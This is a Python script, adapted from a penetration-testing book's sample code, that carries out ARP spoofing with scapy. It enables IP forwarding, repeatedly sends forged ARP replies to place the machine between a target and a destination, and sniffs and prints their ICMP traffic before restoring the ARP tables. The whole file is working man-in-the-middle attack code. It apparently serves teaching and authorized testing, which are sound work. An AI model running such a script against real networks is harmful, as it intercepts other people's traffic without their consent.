#!/usr/bin/python3
# coding: UTF-8

# This code is based on https://github.com/oreilly-japan/pentest-starting-with-port-scanner
# https://github.com/oreilly-japan/pentest-starting-with-port-scanner/blob/main/code/chapter02/sniff-icmp-by-arp-spoofing.py
# Kotake Taichi @Sterra Security Co.,Ltd., "pentest starting with port scanner", O'reilly Japan, ISBN 978-4-8144-0042-3

import argparse
import sys
import time

from multiprocessing import Process
from scapy.all import Ether, ARP, send, sniff, srp1

def enable_ip_forward():
    ip_forward_path = '/proc/sys/net/ipv4/ip_forward'
    with open(ip_forward_path, 'w') as f:
        # sudo sysctl net.ipv4.ip_forward = 1
        f.write('1')

def get_mac_addr(target_ip):
    res = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_ip, op='who-has'), timeout=3, verbose=0)
    if res:
        return res.src
    return None

def spoof(target_ip, dest_ip):
    target_mac = get_mac_addr(target_ip)
    arp_res = ARP(
                pdst=target_ip,
                hwdst=target_mac,
                psrc=dest_ip,
                op='is-at'
            )
    send(arp_res, verbose=0)

def restore(target_ip, dest_ip):
    target_mac = get_mac_addr(target_ip)
    dest_mac = get_mac_addr(dest_ip)
    arp_res = ARP(
                pdst=target_ip,
                hwdst=target_mac,
                psrc=dest_ip,
                hwsrc=dest_mac,
                op='is-at'
            )
    send(arp_res, count=5, verbose=0)

# callback functions for sniff
def print_pkt(pkt):
    pkt.show()

def sniff_icmp():
    sniff(filter='icmp', prn=print_pkt)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='Sniffing ICMP by ARP spoofing')
    parser.add_argument('target', help='Target Ip Address')
    parser.add_argument('dest', help='Destination Ip Address')

    args = parser.parse_args()
    target = args.target
    dest = args.dest
    enable_ip_forward()
    try:
        sniff_process = Process(target=sniff_icmp)
        sniff_process.start()
        print('Start sniffing...')
        print('Start ARP spoofing...')
        while True:
            spoof(target, dest)
            spoof(dest, target)
            time.sleep(2)
    except KeyboardInterrupt:
        print('Restoreing the network...')
        restore(target, dest)
        restore(dest, target)
